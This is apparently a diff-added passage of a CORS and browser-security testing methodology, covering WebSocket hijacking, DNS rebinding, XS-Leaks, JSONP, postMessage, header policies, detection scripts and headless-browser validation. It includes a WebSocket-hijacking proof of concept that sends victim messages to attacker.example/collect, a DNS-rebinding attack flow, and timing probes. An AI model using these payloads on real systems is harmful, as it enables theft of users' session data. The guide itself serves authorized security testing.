+  400 Bad Request
+  401 Unauthorized
+  403 Forbidden
+  404 Not Found
+  405 Method Not Allowed
+  429 Too Many Requests
+  500 Internal Server Error
+  502 Bad Gateway
+  503 Service Unavailable
+
+Investigate:
+- Does the normal response include CORS headers?
+- Does the error response include CORS headers?
+- Does the login response have a different policy?
+- Does an expired session produce a readable response?
+- Do backend exceptions reveal sensitive details?
+- Does the WAF return a different CORS configuration?
+- Are error bodies readable from an untrusted origin?
+
+Error responses can contain stack traces, internal identifiers, or diagnostic
+information.
+
+However, a readable generic error is not automatically a security finding.
+Identify sensitive information and meaningful impact.
+
+================================================================================
+17. AUTHENTICATION-STATE DIFFERENTIAL TESTING
+================================================================================
+
+Use controlled accounts and compare:
+
+  State                     Test objective
+  ------------------------- ----------------------------------------
+  Logged out                Identify public exposure
+  Account A logged in       Identify authenticated exposure
+  Account B logged in       Compare account isolation
+  Expired session           Inspect session expiration behavior
+  Revoked session           Confirm invalidation
+  Lower privilege role      Compare access control
+  Higher privilege test role Check role-specific behavior
+
+Compare:
+- HTTP status
+- Response body
+- ACAO
+- ACAC
+- Vary
+- Cookie behavior
+- Redirects
+- Browser readability
+- Endpoint authorization
+
+Important distinction:
+
+If Account A can read Account B's data due to an IDOR, that is an authorization
+flaw. CORS may create an additional browser-based exploitation path, but the
+report should accurately describe both issues.
+
+================================================================================
+18. API VERSION AND ALTERNATE-HOST COMPARISON
+================================================================================
+
+Compare authorized application interfaces:
+
+  /api/
+  /api/v1/
+  /api/v2/
+  /api/v3/
+  /graphql
+  /auth/
+  /account/
+  /mobile/
+  /legacy/
+  /gateway/
+
+Compare authorized hosts:
+
+  api.example.com
+  api-v1.example.com
+  api-v2.example.com
+  auth.example.com
+  gateway.example.com
+  legacy-api.example.com
+
+Investigate:
+- Older APIs with weaker CORS validation
+- New APIs with different middleware
+- Mobile APIs with different authentication
+- Legacy endpoints
+- Staging environments only when explicitly in scope
+- Alternate hostnames
+- Route-specific policy inconsistencies
+
+Do not access out-of-scope systems.
+
+================================================================================
+19. WILDCARD CORS WITH NETWORK-LEVEL ACCESS CONTROL
+================================================================================
+
+Wildcard CORS does not allow credentialed response sharing.
+
+However, an endpoint may still expose sensitive unauthenticated data to
+arbitrary browser origins.
+
+Examples of potential architecture mistakes:
+- An endpoint is intended to be reachable only from a corporate network.
+- A service relies on IP allowlisting but is reachable from a victim's browser.
+- An internal dashboard has no proper authentication.
+- A local service exposes sensitive information to web pages.
+
+Investigate:
+1. Is the resource reachable from the browser?
+2. Is authentication required?
+3. Does the endpoint expose sensitive data?
+4. Does ACAO permit the controlled origin?
+5. Can browser JavaScript actually read the response?
+6. Does the exposure violate the intended security boundary?
+
+Do not equate wildcard ACAO with credentialed CORS.
+
+================================================================================
+20. BROWSER PRIVACY AND CREDENTIAL-MODE TESTING
+================================================================================
+
+Compare:
+
+  fetch(url, { credentials: "omit" });
+  fetch(url, { credentials: "same-origin" });
+  fetch(url, { credentials: "include" });
+
+Observe:
+- Whether the request is sent
+- Whether cookies are included
+- Whether browser privacy controls block cookies
+- Whether the response passes CORS checks
+- Whether the response body is readable
+- Whether behavior differs between browser profiles
+
+Record:
+
+  Browser:
+  Browser version:
+  Operating system:
+  Third-party cookie setting:
+  Cookie SameSite:
+  Cookie Secure:
+  Credential mode:
+  Request sent:
+  Cookie sent:
+  Response received:
+  Response readable:
+
+Do not claim credentialed data exposure unless the browser actually sends the
+relevant credentials and allows the script to read the response.
+
+================================================================================
+21. PRIVATE NETWORK ACCESS (PNA) INVESTIGATION
+================================================================================
+
+Private Network Access is related to browser protection for requests from
+less-private network contexts toward more-private address spaces.
+
+It is an adjacent browser security area, not simply another ordinary CORS
+misconfiguration.
+
+Depending on browser implementation and current behavior, investigate relevant
+preflight signals such as:
+
+  Access-Control-Request-Private-Network: true
+
+and:
+
+  Access-Control-Allow-Private-Network: true
+
+21.1 Potential Targets
+
+Only investigate systems within explicit scope:
+- Internal web applications
+- Private network services
+- Local development services
+- Router or device management interfaces
+- Internal dashboards
+- Localhost services
+- Private API endpoints
+
+21.2 Investigation Checklist
+
+- Is the destination actually in a private or local address space?
+- Can the browser reach it from the test origin?
+- Does the browser send a PNA-related preflight?
+- How does the server respond?
+- Does the browser permit the actual request?
+- Is authentication required?
+- Can the test page read the response?
+- Does the endpoint expose meaningful sensitive information?
+
+Browser support and enforcement behavior can change. Verify current behavior in
+the specific browser version under test.
+
+Do not classify every private-network request issue as a CORS vulnerability.
+Report it under the most accurate browser security category.
+
+================================================================================
+22. WEBSOCKET ORIGIN VALIDATION (SEPARATE CATEGORY)
+================================================================================
+
+WebSockets use an Origin header during the handshake, but ordinary CORS
+response-sharing rules do not govern WebSocket security in the same way as
+Fetch/XHR.
+
+Investigate:
+- Whether the WebSocket server validates Origin
+- Whether it trusts arbitrary origins
+- Whether it relies only on cookies
+- Whether cross-site WebSocket hijacking is possible
+- Whether authentication is required
+- Whether the connection exposes sensitive data
+- Whether state-changing messages are accepted
+
+Example handshake header:
+
+  Origin: https://attacker.example
+
+A server that accepts untrusted origins may have an Origin-validation weakness.
+
+Use a separate finding category when appropriate. Do not report WebSocket Origin
+validation as ordinary CORS misconfiguration.
+
+22.1 Cross-Site WebSocket Hijacking (CSWSH)
+
+CSWSH is the primary exploitation pattern. A PoC:
+
+  <script>
+    const ws = new WebSocket("wss://api.example.com/ws");
+    ws.onopen = () => ws.send(JSON.stringify({ action: "getProfile" }));
+    ws.onmessage = (e) => {
+      fetch("https://attacker.example/collect", {
+        method: "POST",
+        mode: "no-cors",
+        body: e.data
+      });
+    };
+  </script>
+
+The victim's browser attaches cookies to the WebSocket handshake if the server
+does not validate Origin. The attacker page then receives all messages.
+
+================================================================================
+PART V — ULTIMATE ADVANCED TECHNIQUES (V4.0)
+================================================================================
+
+================================================================================
+23. DNS REBINDING COMBINED WITH CORS POLICY MANIPULATION
+================================================================================
+
+DNS rebinding is a powerful technique that can bypass Same-Origin Policy without
+any CORS misconfiguration at all. A guide claiming "ultimate advanced" status
+must cover it.
+
+23.1 What is DNS Rebinding?
+
+DNS rebinding exploits the fact that browsers enforce SOP based on hostname, not
+IP address. An attacker-controlled DNS server can alternate responses between:
+
+- The attacker's own IP (to serve the malicious page)
+- The victim service's IP (to access the target)
+
+After the page loads, subsequent requests to the same hostname resolve to the
+internal/victim IP, and the browser believes them to be same-origin.
+
+23.2 Why It Matters for CORS
+
+- It bypasses SOP entirely when no CORS headers exist.
+- It is effective against internal services that never intended to be exposed
+  to the browser.
+- It bypasses wildcard CORS restrictions because the request appears same-origin.
+- It is frequently the only way to reach services on private networks.
+
+23.3 Attack Flow
+
+  1. Attacker registers evil.example with a controlled authoritative DNS server.
+  2. DNS TTL is set to 0 or 1 second.
+  3. First resolution returns attacker's web server IP.
+  4. Victim visits https://evil.example and the page loads.
+  5. DNS is re-resolved; now returns the target's IP (e.g., 192.168.1.1).
+  6. JavaScript in the loaded page performs fetch("/api/admin") — resolves to
+     the internal target and is treated as same-origin.
+  7. Response is read by the attacker's JavaScript.
+
+23.4 Constraints and Defenses
+
+Constraints:
+- The target must be reachable from the victim's browser.
+- The target's server must not require a Host header mismatch (most do not
+  check).
+- HTTPS targets require a valid certificate for evil.example — only feasible if
+  the target does not use HSTS and the attacker can present a cert (rare for
+  public CAs, common for local/internal with self-signed).
+- The victim must keep the page open long enough.
+
+Defenses to look for:
+- DNS pinning (browser-level, inconsistent)
+- Private Network Access enforcement
+- Host header validation on the target
+- HSTS on the target domain
+- Certificate pinning
+
+23.5 Testing Checklist
+
+- Is the target reachable from a browser on the tested network?
+- Does the target validate the Host header?
+- Does the target rely on IP allowlisting?
+- Is the target HTTP or HTTPS?
+- Does the browser enforce PNA for the target address space?
+- Can a controlled DNS server be used within authorized scope?
+
+23.6 Why It Belongs in a CORS Assessment
+
+Even when CORS is not the vector, DNS rebinding frequently exposes the same
+class of data CORS misconfigurations expose. Report it under "browser security
+boundary bypass" but include the CORS/rebinding interaction analysis.
+
+================================================================================
+24. CROSS-SITE LEAKS (XS-LEAKS) AND CORS ERROR LEAKS
+================================================================================
+
+CORS misconfigurations frequently combine with XS-Leaks (timing, error events,
+cache probing, window.length, postMessage side channels) to extract information
+even when CORS blocks body reads.
+
+24.1 What are XS-Leaks?
+
+XS-Leaks are side channels that allow one origin to infer information about
+another origin's state, based on observable browser behavior — without reading
+the response body.
+
+24.2 Common XS-Leak Techniques Combined with CORS
+
+  Technique             Signal observed
+  --------------------- ---------------------------------------------------
+  Error events          onerror vs onload on <img>, <script>, <link>
+  Timing                fetch/iframe load duration differences
+  Cache probing         Response cached vs not cached (via timing)
+  Frame counting        window.length after iframe load
+  COOP / CSP detection  Behavior differences
+  Redirect detection    Location changes visible through timing
+  postMessage leaks     Window replies differently based on state
+  Status code inference Timing differences between 401/403/200
+  Size inference        Timing / resource timing entries
+  Fetch redirect mode   "opaqueredirect" vs error
+
+24.3 CORS-Enabled XS-Leaks
+
+A common pattern: even when CORS blocks the response body, the browser still:
+
+- Sends the request.
+- Delivers the response to the server (state change may occur).
+- Distinguishes success from failure via the promise resolution and error type.
+- Exposes response timing via the promise rejection/resolution timing.
+
+Exploit example:
+
+  async function probe(url) {
+    const t0 = performance.now();
+    try {
+      await fetch(url, { credentials: "include", mode: "no-cors" });
+      return { status: "loaded", time: performance.now() - t0 };
+    } catch (e) {
+      return { status: "error", time: performance.now() - t0 };
+    }
+  }
+
+Even under no-cors, the timing reveals whether the resource loaded, was cached,
+or redirected — which can leak authenticated state.
+
+24.4 Combining CORS + XS-Leaks
+
+The most powerful scenario:
+- CORS misconfiguration permits body reads.
+- XS-Leak fills gaps where CORS blocks the body.
+- Together they can fully enumerate authenticated state across many endpoints.
+
+24.5 Testing Checklist
+
+- Can the endpoint's state be inferred via timing?
+- Does the endpoint return distinguishable errors when credentialed vs not?
+- Does the browser cache the response? (probe via timing)
+- Can iframe onload/onerror distinguish success?
+- Can window.length reveal state?
+- Does Resource Timing expose the size / duration? (see Timing-Allow-Origin)
+
+================================================================================
+25. JSONP AND LEGACY XSSI DATA EXPOSURE
+================================================================================
+
+25.1 What is JSONP?
+
+JSONP is a legacy technique for cross-origin data retrieval by loading a
+<script> tag that points to the JSON endpoint with a callback parameter:
+
+  <script src="https://api.example.com/data?callback=handleData"></script>
+
+If the endpoint wraps the response in handleData(...), the browser executes it
+as same-origin script — bypassing SOP entirely.
+
+25.2 Why It Matters
+
+- JSONP endpoints bypass CORS entirely because <script> tags are not subject to
+  CORS.
+- Historical APIs frequently still support ?callback=, ?jsonp=, ?cb=.
+- If the endpoint is authenticated and reflects the callback name without
+  sanitization, it may be JSONP + XSS.
+
+25.3 Detection
+
+Test:
+
+  ?callback=test
+  ?jsonp=test
+  ?cb=test
+  ?jsoncallback=test
+  ?format=jsonp
+  ?_=test
+  ?wrap=test
+
+Look for a response wrapped as:
+
+  test({...data...});
+
+25.4 XSSI (Cross-Site Script Inclusion)
+
+Even without a callback parameter, if an endpoint returns a JavaScript file that
+contains sensitive data, an attacker can include it via <script> and read it
+through prototype manipulation or error messages.
+
+Modern defenses:
+- Require JSON with a specific Content-Type (not text/javascript).
+- Prefix responses with an anti-XSSI token: )]}',
+- Validate X-Requested-With or custom headers.
+- Do not accept GET for sensitive data.
+
+25.5 JSONP + CORS Interaction
+
+If a legacy JSONP endpoint is protected by CORS policy, the CORS policy is
+irrelevant to JSONP exploitation. CORS and JSONP must be assessed separately.
+
+Report JSONP exposure as its own category.
+
+================================================================================
+26. SERVICE WORKER CORS BYPASS BEHAVIORS
+================================================================================
+
+26.1 What is a Service Worker?
+
+A service worker is a background script that intercepts network requests for
+its controlling origin.
+
+26.2 Why It Matters
+
+- A service worker can modify requests and responses before CORS enforcement
+  in some scenarios.
+- A service worker registered on a trusted origin can transparently read
+  cross-origin responses fetched by that origin.
+- If an attacker can register a service worker on a trusted subdomain (via XSS
+  or misconfiguration), they can intercept sensitive cross-origin traffic.
+
+26.3 Investigate
+
+- Is a service worker registered on any trusted origin?
+- Does it use credentials: "include"?
+- Does it cache sensitive responses (potential persistent exposure)?
+- Does it proxy cross-origin requests?
+- Is the service worker's scope overly broad?
+- Is there any XSS on a service worker-capable origin?
+
+26.4 Attack Pattern
+
+  1. Find XSS on a trusted subdomain (e.g., https://trusted.example).
+  2. Register a service worker there.
+  3. The service worker intercepts all requests from that origin.
+  4. If the origin fetches from a sensitive API (cross-origin with CORS
+     allowance), the service worker reads and exfiltrates the response.
+
+================================================================================
+27. POSTMESSAGE ORIGIN VALIDATION WEAKNESSES
+================================================================================
+
+27.1 What is postMessage?
+
+window.postMessage allows cross-origin communication between frames/windows.
+
+27.2 Why It Belongs in a CORS Assessment
+
+postMessage is frequently paired with CORS misconfigurations in real exploit
+chains. Insecure postMessage handlers can:
+
+- Accept messages from any origin (no event.origin check).
+- Leak sensitive data to any frame.
+- Execute state-changing operations on the recipient.
+
+27.3 Investigate
+
+- Does the page use window.addEventListener("message", handler)?
+- Does the handler validate event.origin?
+- Does it use targetOrigin = "*" when sending?
+- Does the handler act on message content without validating sender?
+- Are tokens/sessions/PII passed through messages?
+
+27.4 Detection
+
+  <iframe src="https://target.example"></iframe>
+  <script>
+    const frame = document.querySelector("iframe");
+    window.addEventListener("message", (e) => {
+      console.log("Origin:", e.origin, "Data:", e.data);
+    });
+    setInterval(() => frame.contentWindow.postMessage("ping", "*"), 1000);
+  </script>
+
+Any leaked data indicates weak origin validation.
+
+27.5 Combined CORS + postMessage Exploitation
+
+The most dangerous combination: CORS allows the origin, and the page uses
+postMessage to deliver the response to a parent/child frame. The attack
+sometimes only needs postMessage validation weakness — CORS may be irrelevant.
+
+================================================================================
+28. CORP, COEP, COOP AND CORS INTERACTION
+================================================================================
+
+These policies are related but distinct.
+
+  Policy  Purpose                                              Interaction with CORS
+  ------- ---------------------------------------------------- -----------------------
+  CORS    Controls cross-origin response sharing                Direct
+  CORP    Controls which origins may load a resource (no-cors)  Blocks cross-origin load
+  COEP    Enforces cross-origin isolation (require-corp)        Requires CORP or CORS
+  COOP    Controls browsing-context group relationships         Affects window.opener leaks
+  CSP     Restricts resource loading and script execution       Restricts exfiltration
+  SOP     Restricts cross-origin interactions                   Baseline enforcement
+  PNA     Protects access to more-private address spaces        Preflight signal
+
+28.1 CORP (Cross-Origin-Resource-Policy)
+
+Values: same-origin, same-site, cross-origin.
+
+  Cross-Origin-Resource-Policy: same-origin
+
+Blocks loading from other origins even if CORS would allow. Test whether CORP
+blocks the request or only the load.
+
+28.2 COEP (Cross-Origin-Embedder-Policy)
+
+  Cross-Origin-Embedder-Policy: require-corp
+
+Requires all cross-origin resources to be CORS-enabled or CORP-marked. This can
+change exploitability of an otherwise permissive CORS endpoint — if COEP blocks
+the request, the CORS policy is irrelevant.
+
+28.3 COOP (Cross-Origin-Opener-Policy)
+
+Values: unsafe-none, same-origin-allow-popups, same-origin.
+
+  Cross-Origin-Opener-Policy: same-origin
+
+Prevents window.opener access from cross-origin popups — relevant to XS-Leaks
+and window-based attacks.
+
+28.4 Interaction Matrix
+
+  Scenario                                    Result
+  ------------------------------------------- ---------------------------------
+  ACAO reflects attacker origin, no CORP      Browser accepts, JS reads (CORS)
+  ACAO reflects attacker origin, CORP=SO      Browser blocks load (CORP wins)
+  ACAO=* but COEP=require-corp                Browser requires CORP/CORS
+  No ACAO, COOP=same-origin                   Opener access blocked
+  ACAO allows, CSP report-only                CSP may report but allow
+
+Investigate CORP, COEP, COOP when present. Do not classify their weaknesses as
+CORS issues — report each under the appropriate category.
+
+================================================================================
+29. BROWSER DIFFERENTIAL BEHAVIOR
+================================================================================
+
+Different browsers handle edge cases differently. For an "ultimate" assessment,
+test in Chrome, Firefox, Safari, and Edge where possible.
+
+29.1 Known Differences (2024-2025)
+
+  Behavior                         Chrome         Firefox        Safari
+  -------------------------------- -------------- -------------- --------------
+  Duplicate ACAO headers           First wins     Reject?        Reject?
+  Origin: null handling            Varies         Varies         Varies
+  Trailing dot normalization       Partial        Partial        Strict
+  Default port normalization       Yes            Yes            Mostly
+  Third-party cookie enforcement   Phase-out      Default block  ITP strict
+  SameSite=None + Secure required  Yes            Yes            Yes
+  Preflight cache max              ~2h capped     ~24h           Varies
+  PNA enforcement                  Yes            Partial        No
+  IDN normalization                Punycode       Punycode       Punycode
+  Case-insensitive host            Yes            Yes            Yes
+  Backslash handling               Often ignores  Strict         Strict
+
+29.2 Third-Party Cookie Restrictions (2024-2025)
+
+- Chrome: progressively blocking; user control.
+- Firefox: Total Cookie Protection default for many.
+- Safari: ITP blocks aggressively.
+- Edge: mirrors Chrome.
+
+Impact: A CORS misconfiguration may not be exploitable in browsers with strict
+third-party cookie protection unless the cookie is SameSite=None; Secure.
+
+29.3 Testing Protocol
+
+For each finding:
+1. Test in Chrome (latest stable).
+2. Test in Firefox (latest stable).
+3. Test in Safari (latest stable).
+4. Test in Edge (latest stable).
+5. Document browser-specific behavior.
+6. Report the set of browsers in which the issue is exploitable.
+
+29.4 Reporting Language
+
+"Exploitable in Chrome 130 and Edge 130 (verified). Not exploitable in Firefox
+131 due to third-party cookie protections, unless the session cookie is
+SameSite=None; Secure."
+
+================================================================================
+30. HTTP/2, HTTP/3 AND REQUEST SMUGGLING INTERACTIONS
+================================================================================
+
+30.1 HTTP/2 Header Handling
+
+- Headers are HPACK-encoded; duplicate headers may be rejected at the frame
+  layer.
+- :authority pseudo-header replaces Host.
+- Origin header still applies.
+- Some proxies strip or merge duplicate ACAO inconsistently under HTTP/2.
+
+Investigate:
+- Whether the endpoint behaves differently under HTTP/1.1 vs HTTP/2.
+- Whether duplicate ACAO is possible under HTTP/2.
+- Whether the same origin policy applies consistently.
+
+30.2 Request Smuggling + CORS
+
+Smuggled requests can bypass Origin-based policies at the infrastructure layer.
+
+Scenario: A frontend accepts requests only from trusted Origins. A smuggling
+attack through a misconfigured proxy injects a request to a backend with a
+trusted Origin header, bypassing the policy.
+
+Test for smuggling only in authorized scopes, and use established techniques
+(CL.TE, TE.CL, TE.TE, HTTP/2 downgrade). CORS is an outcome check, not the
+primary vector.
+
+30.3 HTTP/3
+
+HTTP/3 uses QUIC. Header handling is similar to HTTP/2, but intermediaries may
+behave differently. Test with curl --http3 or a modern browser.
+
+================================================================================
+31. MOBILE, WEBVIEW AND ELECTRON CORS BEHAVIOR
+================================================================================
+
+31.1 Mobile Apps (iOS/Android)
+
+- Native HTTP clients typically ignore CORS (CORS is a browser mechanism).
+- In-app WebViews do enforce CORS but sometimes with relaxed policies.
+- Hybrid apps (Cordova, Capacitor) may allow file:// origins, producing Origin:
+  null behavior.
+
+Test:
+- In-app WebView requests with attacker Origin headers.
+- file:// origin behavior (Origin: null).
+- Custom URL scheme origins.
+
+31.2 Electron
+
+- Electron's BrowserWindow uses Chromium, but webSecurity can be disabled.
+- With webSecurity: false, CORS is not enforced — a significant risk if the app
+  loads untrusted content.
+- Preload scripts can bridge native APIs into the renderer — dangerous if
+  combined with weak CORS.
+
+Investigate Electron apps in scope:
+- Is webSecurity disabled?
+- Are remote URLs loaded?
+- Does the renderer have nodeIntegration or contextIsolation misconfigurations?
+
+31.3 Reporting
+
+Mobile/WebView/Electron CORS issues should be reported under "client-side
+platform security" and cross-referenced with the CORS category if the root cause
+is a CORS policy.
+
+================================================================================
+32. DOCUMENT.DOMAIN AND LEGACY TRUST BOUNDARIES
+================================================================================
+
+32.1 document.domain
+
+Setting document.domain relaxes same-origin checks between sibling subdomains.
+This is deprecated but may still be present in legacy applications.
+
+32.2 Why It Matters
+
+- A trusted subdomain can set document.domain = "example.com" and read
+  responses from another subdomain that also sets it — bypassing CORS entirely.
+- If any subdomain is compromised (XSS, subdomain takeover), the relaxed trust
+  boundary may allow cross-subdomain reads.
+
+32.3 Investigate
+
+- Does any application set document.domain?
+- Which sibling subdomains must cooperate?
+- Are any of those subdomains attacker-controllable or takeover-prone?
+
+================================================================================
+33. ACCESS-CONTROL-EXPOSE-HEADERS EXPLOITATION
+================================================================================
+
+33.1 What Expose-Headers Does
+
+  Access-Control-Expose-Headers: X-Auth-Token, X-User-ID, X-Internal-Reference
+
+By default, a cross-origin read can access only these simple response headers:
+Cache-Control, Content-Language, Content-Length, Content-Type, Expires,
+Last-Modified, Pragma.
+
+Expose-Headers extends that list.
+
+33.2 Why It Matters
+
+If the endpoint returns sensitive headers (tokens, IDs, internal references) and
+the CORS policy (ACAO) allows an untrusted origin, JavaScript on that origin can
+read those headers even if the body is benign.
+
+33.3 Test Cases
+
+Test endpoints with:
+
+  Access-Control-Expose-Headers: *
+  Access-Control-Expose-Headers: X-Auth-Token, Authorization
+  Access-Control-Expose-Headers: X-User-ID
+
+Cross-origin PoC:
+
+  fetch("https://api.example.com/login", {
+    method: "POST",
+    credentials: "include",
+    body: new URLSearchParams({ user: "victim", pass: "..." })
+  }).then(r => {
+    console.log("Token:", r.headers.get("X-Auth-Token"));
+  });
+
+33.4 Impact
+
+- Token exposure (session, API key).
+- Internal user IDs (aids IDOR chaining).
+- Debug headers (server version, internal IDs).
+
+================================================================================
+34. TIMING-ALLOW-ORIGIN AND RESOURCE TIMING LEAKS
+================================================================================
+
+34.1 Timing-Allow-Origin
+
+  Timing-Allow-Origin: https://trusted.example
+
+Controls which origins may access detailed Resource Timing data via
+performance.getEntriesByType("resource").
+
+34.2 Why It Matters
+
+Without this header (or with it misconfigured to *), a cross-origin page can
+read:
+
+- Response duration
+- Transfer size
+- Encoded body size
+- Cached status (transferSize === 0 indicates cache hit)
+- Start time, connect time, DNS time
+
+These leak information about:
+- Whether the user is logged in (response size varies)
+- Whether a resource exists
+- Whether it was cached
+- Whether the request redirected
+
+34.3 Combined CORS + Resource Timing
+
+A wildcard Timing-Allow-Origin with wildcard ACAO on a sensitive endpoint leaks
+size and timing signals, enabling state inference even where the response body
+is unreadable.
+
+34.4 Testing
+
+  const [entry] = performance.getEntriesByType("resource");
+  console.log({
+    duration: entry.duration,
+    transferSize: entry.transferSize,
+    encodedBodySize: entry.encodedBodySize,
+    decodedBodySize: entry.decodedBodySize,
+    nextHopProtocol: entry.nextHopProtocol
+  });
+
+transferSize === 0 reveals cache status — a well-known XS-Leak.
+
+================================================================================
+PART VI — AUTOMATION & VALIDATION
+================================================================================
+
+================================================================================
+35. ADVANCED AUTOMATION AND DETECTION STRATEGY
+================================================================================
+
+Automation should classify observations rather than automatically declaring
+every permissive response vulnerable.
+
+35.1 Recommended Detection Categories
+
+  CATEGORY 0  — NO CORS RESPONSE
+  CATEGORY 1  — STATIC TRUSTED ORIGIN
+  CATEGORY 2  — WILDCARD ACAO
+  CATEGORY 3  — ORIGIN REFLECTION
+  CATEGORY 4  — NULL ORIGIN TRUST
+  CATEGORY 5  — WEAK ORIGIN VALIDATION
+  CATEGORY 6  — CREDENTIALED CORS
+  CATEGORY 7  — PERMISSIVE PREFLIGHT
+  CATEGORY 8  — SUBDOMAIN TRUST
+  CATEGORY 9  — INSECURE SCHEME TRUST
+  CATEGORY 10 — DUPLICATE OR CONFLICTING CORS HEADERS
+  CATEGORY 11 — ERROR-RESPONSE CORS DIFFERENCE
+  CATEGORY 12 — REDIRECT-CHAIN DIFFERENCE
+  CATEGORY 13 — CACHE-RELATED CORS DIFFERENCE
+  CATEGORY 14 — AUTHENTICATION-STATE DIFFERENCE
+  CATEGORY 15 — CDN / PROXY / GATEWAY DIFFERENCE
+  CATEGORY 16 — ORIGIN PARSER DIFFERENTIAL
+  CATEGORY 17 — API VERSION / HOST DIFFERENCE
+  CATEGORY 18 — PRIVATE NETWORK ACCESS OBSERVATION
+  CATEGORY 19 — WEBSOCKET ORIGIN VALIDATION OBSERVATION
+  CATEGORY 20 — BROWSER-CONFIRMED READABLE EXPOSURE
+  CATEGORY 21 — DNS REBINDING REACHABILITY (NEW)
+  CATEGORY 22 — JSONP / XSSI EXPOSURE (NEW)
+  CATEGORY 23 — POSTMESSAGE / XS-LEAK SIGNAL (NEW)
+
+35.2 Safe Bash Detection Script
+
+The following script performs basic header-observation checks against a
+specified endpoint. It does not prove exploitability.
+
+  #!/usr/bin/env bash
+
+  set -u
+
+  TARGET="${1:-}"
+  ATTACKER_ORIGIN="${2:-https://attacker.example}"
+
+  if [[ -z "$TARGET" ]]; then
+    echo "Usage: $0 <authorized-target-url> [controlled-origin]"
+    exit 1
+  fi
+
+  echo "[*] Target: $TARGET"
+  echo "[*] Test Origin: $ATTACKER_ORIGIN"
+  echo
+
+  check_origin() {
+    local origin="$1"
+    echo "=========================================="
+    echo "[*] Testing Origin: $origin"
+    echo "=========================================="
+    curl -sS --max-time 15 -D - -o /dev/null \
+      -H "Origin: $origin" "$TARGET" \
+      | tr -d '\r' \
+      | grep -Ei '^(HTTP/|access-control-|vary:|cache-control:|age:|via:|x-cache:|location:|timing-allow-origin:)' \
+      || true
+    echo
+  }
+
+  check_origin "$ATTACKER_ORIGIN"
+  check_origin "null"
+  check_origin "https://unrelated.example"
+  check_origin "http://trusted.example"
+  check_origin "https://trusted.example.attacker.example"
+  check_origin "https://trusted.example"
+
+Run:
+
+  chmod +x cors-check.sh
+  ./cors-check.sh \
+    "https://api.example.com/api/profile" \
+    "https://attacker.example"
+
+Only use authorized endpoints.
+
+35.3 Preflight Observation
+
+  curl -sS -i -X OPTIONS \
+    -H "Origin: https://attacker.example" \
+    -H "Access-Control-Request-Method: PUT" \
+    -H "Access-Control-Request-Headers: authorization,content-type" \
+    "https://api.example.com/api/profile"
+
+35.4 Automation Limitations
+
+A command-line scanner cannot reliably determine:
+- Whether a real browser will send cookies
+- Whether third-party cookies are blocked
+- Whether a browser accepts the response
+- Whether JavaScript can read the response
+- Whether sensitive data is exposed
+- Whether the endpoint is properly authorized
+- Whether an attack has meaningful impact
+
+Automation should produce candidate findings for manual browser validation.
+
+================================================================================
+36. HEADLESS-BROWSER VALIDATION WITH PLAYWRIGHT/PUPPETEER
+================================================================================
+
+36.1 Why Headless Browsers?
+
+Section 35.4 correctly identifies that CLI scanners cannot validate browser
+behavior. Headless browsers (Playwright, Puppeteer) solve this by running a real
+Chromium/WebKit/Firefox engine.
+
+36.2 Playwright Validation Script (Node.js)
+
+  // npm install playwright
+  // npx playwright install chromium
+
+  const { chromium } = require("playwright");
+
+  (async () => {
+    const browser = await chromium.launch({ headless: true });
+    const context = await browser.newContext();
+    const page = await context.newPage();
+
+    // Load the test account first (authorized session)
+    await page.goto("https://app.example.com/login");
+    await page.fill('input[name="user"]', process.env.TEST_USER);
+    await page.fill('input[name="pass"]', process.env.TEST_PASS);
+    await page.click('button[type="submit"]');
+    await page.waitForURL("https://app.example.com/dashboard");
+
+    // Now navigate to the attacker-controlled PoC page
+    await page.goto("https://attacker.example/cors-poc.html");
+
+    // Wait for the PoC to execute and report
+    const result = await page.evaluate(() => window.__corsResult);
+
+    console.log("CORS PoC result:", result);
+
+    await browser.close();
+  })();
+
+36.3 In-Page Validation Helper
+
+On the attacker PoC page, expose the result globally:
+
+  <script>
+    window.__corsResult = null;
+    fetch("https://api.example.com/api/profile", { credentials: "include" })
+      .then(r => r.text().then(body => ({ status: r.status, body })))
+      .then(data => window.__corsResult = { ok: true, ...data })
+      .catch(e => window.__corsResult = { ok: false, error: String(e) });
+  </script>
+
+36.4 Multi-Browser Test Matrix
+
+  const engines = ["chromium", "firefox", "webkit"];
+
+  for (const engine of engines) {
+    const b = await playwright[engine].launch();
+    const ctx = await b.newContext();
+    const p = await ctx.newPage();
+    await p.goto("https://attacker.example/cors-poc.html");
+    const r = await p.evaluate(() => window.__corsResult);
+    console.log(engine, "=>", r);
+    await b.close();
+  }
+
+36.5 Sample Output
+
+  chromium => { ok: true, status: 200, body: '{"email":"test@example.com"}' }
+  firefox  => { ok: false, error: "TypeError: NetworkError when attempting to fetch resource." }
+  webkit   => { ok: false, error: "TypeError: Load failed" }
+
+This gives a definitive, per-browser answer for reporting.
+
+36.6 Safety and Scope
+
+- Only run headless validation against authorized targets.
+- Use test accounts.
+- Do not collect real user data.
+- Do not use headless automation to attack production.
+
+================================================================================
+37. TOOLING AND EXTENSIONS
+================================================================================
+
+37.1 Open Source
+
+  Tool              Language    Purpose
+  ----------------- ----------- ----------------------------------------
+  corsy             Python      CORS misconfiguration scanner
+  CORScanner        Python      CORS scanner with multiple probes
+  CorsMe            Python      Lightweight CORS fuzzer
+  nuclei            Go          Templates for CORS checks
+  arjun             Python      Parameter discovery for callback/JSONP
+  ffuf              Go          Fuzzing for callback parameters
+  mitmproxy         Python      Origin-header fuzzing / proxying
+  Playwright        Node/Python Headless multi-browser validation
+  Puppeteer         Node        Headless Chromium validation
+
+37.2 Burp Extensions
+
+- "CORS Additional Checks" (PortSwigger BApp Store) — additional CORS probes
+- "CORSy Burp Extension" (community) — integration with corsy
+- "Authorize" — auth-state comparisons
+- "Turbo Intruder" — parallel origin fuzzing
+- "Param Miner" — hidden parameter discovery (callback/JSONP)
+
+37.3 Nuclei Template Example
+
+  id: cors-reflection
+  info:
+    name: CORS Origin Reflection
+    severity: info
+    tags: cors
+  http:
+    - method: GET
+      path:
+        - "{{BaseURL}}"
+      headers:
+        Origin: "https://attacker.example"
+      matchers:
+        - type: regex
+          part: header
+          regex:
+            - "(?i)access-control-allow-origin:\\s*https://attacker\\.example"
+            - "(?i)access-control-allow-credentials:\\s*true"
+
+Nuclei output is a candidate — validate manually.
+
+37.4 Workflow
+
+  1. Use corsy / CORScanner for broad candidate discovery.
+  2. Use Nuclei templates for repeatable coverage.
+  3. Use Burp for manual refinement.
+  4. Use Playwright for browser confirmation.
+  5. Use arjun/ffuf for callback/JSONP discovery.
+
+================================================================================
+38. BURP SUITE TESTING WORKFLOW
+================================================================================
+
+38.1 Identify Requests
+
+Browse the authorized application while Burp Proxy is enabled.
+
